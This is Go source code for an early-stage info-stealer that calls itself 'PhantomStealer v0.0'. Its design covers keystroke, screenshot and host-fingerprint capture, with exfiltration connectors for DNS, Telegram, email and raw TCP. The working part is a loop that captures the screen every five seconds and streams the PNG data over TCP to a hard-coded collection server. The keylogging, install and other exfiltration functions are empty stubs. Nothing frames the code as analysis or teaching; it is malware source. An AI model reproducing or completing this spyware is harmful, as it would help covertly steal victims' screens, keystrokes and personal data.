package main

import (
	"bufio"
	"bytes"
	"fmt"
	"image/png"
	"net"
	"time"

	"github.com/kbinani/screenshot"
)

type KeystrokeCapture struct {
	keycap    []byte
	timestamp time.Time
}

type ScreenshotCapture struct {
	screencap []byte
	timestamp time.Time
}

type FingerprintCapture struct {
	os        string
	hostname  string
	timestamp time.Time
	// etc
}

type Serializer interface {
	Serialize() []byte
}

type Exfiltrater interface {
	Exfiltrate() error
}

type DnsConnector struct {
	server string
	port   string
}

type EmailConnector struct {
	server   string
	port     string
	username string
	pass     string
}

type TelegramConnector struct {
	server   string
	port     string
	username string
	pass     string
}

type SimpleConnector struct {
	server string
	port   string
}

const (
	EXFIL_MODE_DNS int = iota
	EXFIL_MODE_TELEGRAM
	EXFIL_MODE_EMAIL
	EXFIL_MODE_SIMPLE
)

const (
	CAP_INTERVAL = time.Second * 5
	//ACTIVATION_DATE =
)

func install() {
}

func runLoop() error {
	// Create connector
	connector := SimpleConnector{
		server: "127.0.0.1",
		port:   "8443",
	}

	connectorClient, err := net.Dial("tcp4", net.JoinHostPort(connector.server, connector.port))
	if err != nil {
		return fmt.Errorf("unable to create connection to exfiltration channel: %w", err)
	}

	for {
		fmt.Println("Taking screencap")
		screenCapData, err := createScreenshot()
		if err != nil {
			return fmt.Errorf("error occurred during runloop: %w", err)
		}

		screenCapture := ScreenshotCapture{
			screencap: screenCapData,
			timestamp: time.Now(),
		}

		_, err = connectorClient.Write(screenCapture.screencap)
		if err != nil {
			return fmt.Errorf("unable to write screen cap to connector client: %w", err)
		}

		time.Sleep(CAP_INTERVAL)
	}

	// Cleanup

	return nil
}

func createScreenshot() ([]byte, error) {
	bounds := screenshot.GetDisplayBounds(0) // TODO: Multimonitor

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		panic(err)
	}

	var buf bytes.Buffer
	bWriter := bufio.NewWriter(&buf)

	png.Encode(bWriter, img)

	return buf.Bytes(), nil
}

func recordKeystrokes() {
}

func (kc KeystrokeCapture) Serialize() []byte {
	return nil
}

func (sc ScreenshotCapture) Serialize() []byte {
	return []byte("foobar")
}

func (fc FingerprintCapture) Serialize() []byte {
	return nil
}

func (dc DnsConnector) Exfiltrate() error {
	return nil
}

func (ec EmailConnector) Exfiltrate() error {
	return nil
}

func (tc TelegramConnector) Exfiltrate() error {
	return nil
}

func main() {
	fmt.Println("PhantomStealer v0.0")

	panic(runLoop())
}
